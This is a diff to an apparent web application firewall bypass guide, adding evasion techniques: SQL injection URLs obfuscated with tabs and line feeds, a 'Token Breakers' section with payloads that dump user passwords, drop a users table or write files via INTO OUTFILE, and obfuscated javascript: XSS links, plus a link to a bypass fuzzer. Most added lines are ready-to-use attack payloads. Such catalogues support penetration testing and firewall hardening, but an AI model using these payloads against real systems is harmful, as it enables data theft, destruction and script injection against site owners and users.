@@ -2426,7 +2426,7 @@ An exotic payload crafted:
 $sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
 ```
 
-__12. Random Tabs__
+__12. Tabs and Line Feeds__
 - Tabs often help to evade firewalls especially regex based ones.
 - Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.
 
@@ -2434,13 +2434,30 @@ __Standard__: `<IMG SRC="javascript:alert();">`
 __Bypassed__: `<IMG SRC="    javascript:alert();">`  
 __Variant__: `<IMG SRC="    jav    ascri    pt:alert    ();">`
 
+__Standard__: `http://test.com/test?id=1 union select 1,2,3`  
+__Standard__: `http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3`
+
 __Standard__: `<iframe src=javascript:alert(1)></iframe>`  
 __Obfuscated__: 
 ```
 <iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
-__13. Obfuscation in Other Formats__  
+__13. Token Breakers__
+- Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.
+- Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
+- However, the request must still remain valid while using token-breakers.
+
+__Case__: Unknown Token for the Tokenizer  
+__Payload__: `?id=‘-sqlite_version() UNION SELECT password FROM users --`  
+
+__Case__: Unknown Context for the Parser (Notice the uncontexted bracket)  
+__Payload 1__: `?id=123);DROP TABLE users --`  
+__Payload 2__: `?id=1337) INTO OUTFILE ‘xxx’ --`  
+
+> __TIP:__ More payloads can be crafted via this [cheat sheet](https://github.com/attackercan/cpp-sql-fuzzer).
+
+__14. Obfuscation in Other Formats__  
 - Many web applications support different encoding types and can interpret the encoding (see below).
 - Obfuscating our payload to a format not supported by WAF but the server can smuggle our payload in.
 
@@ -2581,6 +2598,9 @@ Payload examples:
 <scri\x00pt>alert(1);</scri%00pt>
 <s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
 ```
+__Standard__: `<a href="javascript:alert()">`  
+__Obfuscated__: `<a href="ja0x09vas0x0A0x0Dcript:alert(1)">clickme</a>`  
+__Variant__: `<a 0x00 href="javascript:alert(1)">clickme</a>`
 
 #### Parsing Bugs:
 - RFC states that NodeNames cannot begin with whitespace.
@@ -3186,6 +3206,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ### Evasion:  
 - [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
 - [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
+- [libinjection-fuzzer](https://github.com/migolovanov/libinjection-fuzzer) - A fizzer intended for finding `libinjection` bypasses but can be probably used universally.
 - [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) -  A tool which searches for old DNS records for finding actual site behind the WAF.
 - [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - A tool which finds out supported SSL/TLS ciphers and helps in evading WAFs.
 - [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap) - Tamper scripts in SQLMap obfuscate payloads which might evade some WAFs.
